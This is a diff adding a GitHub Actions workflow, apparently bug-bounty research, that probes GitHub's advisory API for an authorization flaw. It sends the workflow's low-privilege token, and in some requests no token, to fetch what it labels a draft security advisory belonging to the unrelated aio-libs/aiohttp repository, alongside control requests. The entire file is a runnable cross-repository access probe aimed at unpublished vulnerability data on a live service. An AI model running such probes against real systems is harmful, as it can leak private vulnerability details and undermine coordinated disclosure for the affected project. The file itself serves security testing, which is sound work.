@@ -1,0 +1,30 @@
+name: advprobe3
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: probe
+        run: |
+          T="${{ secrets.GITHUB_TOKEN }}"
+          echo "== ctrl global published with lowpriv token =="
+          curl -s -o /tmp/a.json -w "code=%{http_code}\n" -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/advisories/GHSA-f9xw-jh8m-3mwq"
+          head -c 200 /tmp/a.json; echo
+          echo "== ctrl global random with lowpriv token =="
+          curl -s -o /tmp/b.json -w "code=%{http_code}\n" -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/advisories/GHSA-aaaa-bbbb-cccc"
+          head -c 300 /tmp/b.json; echo
+          echo "== ctrl repo random on aiohttp with lowpriv token =="
+          curl -s -o /tmp/c.json -w "code=%{http_code}\n" -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/repos/aio-libs/aiohttp/security-advisories/GHSA-aaaa-bbbb-cccc"
+          head -c 300 /tmp/c.json; echo
+          echo "== cross-repo draft id under aiohttp with lowpriv token =="
+          curl -s -o /tmp/d.json -w "code=%{http_code}\n" -H "Authorization: Bearer $T" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/repos/aio-libs/aiohttp/security-advisories/GHSA-22w2-h2pj-f3v8"
+          head -c 300 /tmp/d.json; echo
+          echo "== global draft with anon =="
+          curl -s -o /tmp/e.json -w "code=%{http_code}\n" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/advisories/GHSA-22w2-h2pj-f3v8"
+          head -c 200 /tmp/e.json; echo
+          echo "== global published with anon =="
+          curl -s -o /tmp/f.json -w "code=%{http_code}\n" -H "X-Bug-Bounty: artex-scan" "https://api.github.com/advisories/GHSA-f9xw-jh8m-3mwq"
+          head -c 200 /tmp/f.json; echo
